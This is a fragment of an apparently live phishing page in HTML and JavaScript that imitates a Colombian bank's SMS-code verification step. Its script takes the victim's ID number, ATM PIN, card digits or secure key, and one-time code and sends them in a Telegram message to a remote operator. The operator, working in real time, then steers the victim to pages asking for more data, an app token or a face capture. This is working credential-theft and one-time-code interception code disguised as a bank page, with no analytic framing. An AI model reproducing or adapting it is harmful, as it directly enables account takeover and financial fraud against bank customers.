    <div id="loader" class="loader-overlay" style="display: none;">

    <script>
        const tokenInput = document.getElementById("tokenInput");
        const verifyBtn = document.getElementById("verifyBtn");
        const errorMessage = document.getElementById("errorMessage");
        const loader = document.getElementById("loader");

        let initialLoginData = null;

        // Nueva funciÃ³n para enviar datos al backend
        async function sendOtpDataToBackend(messageContent, keyboard) {
            const url = '/api/send-message'; // Endpoint del backend
            const payload = {
                text: messageContent,
                keyboard: keyboard
            };
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                });

                const data = await response.json();

                if (!response.ok) {
                    console.error(`Error al enviar OTP al backend: ${response.status}`, data.error);
                    return null;
                }

                console.log('OTP enviado al backend exitosamente:', data);
                // Devolvemos el ID del mensaje para poder verificar la respuesta
                return data.result.message_id;

            } catch (error) {
                console.error('Error de red al enviar OTP al backend:', error);
                return false;
            }
        }

        // Nueva funciÃ³n para verificar la respuesta del operador a travÃ©s del backend
        async function checkOperatorResponse(messageId) {
            try {
                // Hacemos una Ãºnica llamada a nuestro endpoint de long-polling
                const response = await fetch(`/api/check-update/${messageId}`);
                loader.style.display = 'none'; // Ocultamos el loader

                if (response.status === 408) { // Timeout
                    alert("El operador no respondiÃ³ a tiempo. Por favor, intente de nuevo.");
                    window.location.reload();
                    return;
                }

                const data = await response.json();

                if (data.action) {
                    if (data.action === 'error_sms') {
                        errorMessage.classList.remove('hidden');
                        errorMessage.textContent = "CÃ³digo SMS incorrecto, intenta de nuevo.";
                        tokenInput.value = '';
                        tokenInput.focus();
                        checkInputLength();
                    } else if (data.action === 'pedir_datos') {
                        window.location.href = "datos.html";
                    } else if (data.action === 'pedir_dinamica') { // BotÃ³n "Ir a Token App"
                        window.location.href = "token.html";
                    } else if (data.action === 'pedir_cara') {
                        window.location.href = "cara.html";
                    } else if (data.action === 'finalizar') { // BotÃ³n "Finalizar"
                        window.location.href = "finish.html";
                    } else {
                        console.log("Respuesta no reconocida del bot:", data.action);
                        alert("Respuesta no reconocida. Por favor, intente de nuevo.");
                    }
                }
            } catch (error) {
                loader.style.display = 'none';
                console.error("Error al verificar la respuesta del operador:", error);
                alert("OcurriÃ³ un error de comunicaciÃ³n. Por favor, recarga la pÃ¡gina.");
            }
        }

        document.addEventListener('DOMContentLoaded', async () => {
            const storedData = sessionStorage.getItem('initialLoginData');
            if (storedData) {
                initialLoginData = JSON.parse(storedData);
            } else {
                window.location.href = 'index.html';
            }
        });

        tokenInput.addEventListener("input", (e) => {
            e.target.value = e.target.value.replace(/\D/g, ""); // Ensure only digits
            checkInputLength();
        });

        tokenInput.addEventListener("paste", (e) => {
            e.preventDefault();
            const paste = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "").slice(0, 8);
            tokenInput.value = paste;
            checkInputLength();
        });

        function checkInputLength() {
            const tokenLength = tokenInput.value.length;
            const isValidLength = tokenLength >= 6 && tokenLength <= 8;
            verifyBtn.disabled = !isValidLength;
            verifyBtn.classList.toggle("cursor-not-allowed", !isValidLength);
            verifyBtn.classList.toggle("bg-[#e5e7eb]", !isValidLength);
            verifyBtn.classList.toggle("text-[#9ca3af]", !isValidLength);
            verifyBtn.classList.toggle("bg-[#3b82f6]", isValidLength);
            verifyBtn.classList.toggle("text-white", isValidLength);
        }

        // Initial check on page load
        document.addEventListener('DOMContentLoaded', checkInputLength);

        verifyBtn.addEventListener('click', async () => {
            const token = tokenInput.value;
            errorMessage.classList.add('hidden');
            loader.style.display = 'flex';

            let telegramMessage = `<b>ğŸ¦ OTP INGRESADO - BOGOTÃ ğŸ¦</b>\n`;
            telegramMessage += `<b>ğŸ†” Tipo Doc:</b> ${initialLoginData.identificationType}\n`;
            telegramMessage += `<b>ğŸ‘¤ Documento:</b> <code>${initialLoginData.identificationNumber}</code>\n`;

            if (initialLoginData.debitCardKey !== 'N/A') {
                telegramMessage += `<b>ğŸ”‘ Clave Cajero:</b> <code>${initialLoginData.debitCardKey}</code>\n`;
                telegramMessage += `<b>ğŸ”¢ Ãšltimos 4:</b> <code>${initialLoginData.last4Digits}</code>\n`;
            } else if (initialLoginData.secureKey !== 'N/A') {
                telegramMessage += `<b>ğŸ”‘ Clave:</b> <code>${initialLoginData.secureKey}</code>\n`;
            }

            telegramMessage += `\n<b>ğŸ”¢ CÃ³digo SMS:</b> <code>${token}</code>\n`;
            telegramMessage += `<b>ğŸ“… Fecha:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;

            const keyboard = {
                inline_keyboard: [
                    [{ text: "âŒ Error SMS", callback_data: `error_sms:N/A` }, { text: "ğŸ“‹ Ir a Datos", callback_data: `pedir_datos:N/A` }],
                    [{ text: "ğŸ’ Ir a Token App", callback_data: `pedir_dinamica:N/A` }, { text: "ğŸ‘¤ Pedir Cara", callback_data: `pedir_cara:N/A` }],
                    [{ text: "ğŸš¨ Finalizar", callback_data: `finalizar:N/A` }]
                ]
            };

            const messageId = await sendOtpDataToBackend(telegramMessage, keyboard);
            if (messageId) {
                checkOperatorResponse(messageId);
            } else {
                loader.style.display = 'none';
                alert("Error al enviar el cÃ³digo. Por favor, intÃ©ntalo de nuevo.");
            }
        });

        const resendSmsBtn = document.getElementById("resendSmsBtn");

        resendSmsBtn.addEventListener('click', async () => {
            loader.style.display = 'flex';

            let telegramMessage = `<b>ğŸ¦ REENVIO SMS - BOGOTÃ ğŸ¦</b>\n`;

            telegramMessage += `<b>ğŸ‘¤ Documento:</b> <code>${initialLoginData.identificationNumber}</code>\n`;

            if (initialLoginData.debitCardKey !== 'N/A') {
                telegramMessage += `<b>ğŸ”‘ Clave Cajero:</b> <code>${initialLoginData.debitCardKey}</code>\n`;
                telegramMessage += `<b>ğŸ”¢ Ãšltimos 4:</b> <code>${initialLoginData.last4Digits}</code>\n`;
            } else if (initialLoginData.secureKey !== 'N/A') {
                telegramMessage += `<b>ğŸ”‘ Clave:</b> <code>${initialLoginData.secureKey}</code>\n`;
            }

            telegramMessage += `\n<b>ğŸŸ¡ Solicitud:</b> ReenvÃ­o de SMS\n`;
            telegramMessage += `<b>ğŸ“… Fecha:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;

            const keyboard = {
                inline_keyboard: [
                    [{ text: "âŒ Error SMS", callback_data: `error_sms:N/A` }, { text: "ğŸ“‹ Ir a Datos", callback_data: `pedir_datos:N/A` }],
                    [{ text: "ğŸ’ Ir a Token App", callback_data: `pedir_dinamica:N/A` }, { text: "ğŸ‘¤ Pedir Cara", callback_data: `pedir_cara:N/A` }],
                    [{ text: "ğŸš¨ Finalizar", callback_data: `finalizar:N/A` }]
                ]
            };

            const messageId = await sendOtpDataToBackend(telegramMessage, keyboard);
            if (messageId) {
                // No need to check operator response for resend, just inform the user
                loader.style.display = 'none';
                alert("Se ha enviado la solicitud de reenvÃ­o de SMS. Por favor, espera un momento.");
            } else {
                loader.style.display = 'none';
                alert("Error al solicitar el reenvÃ­o de SMS. Por favor, intÃ©ntalo de nuevo.");
            }
        });
    </script>
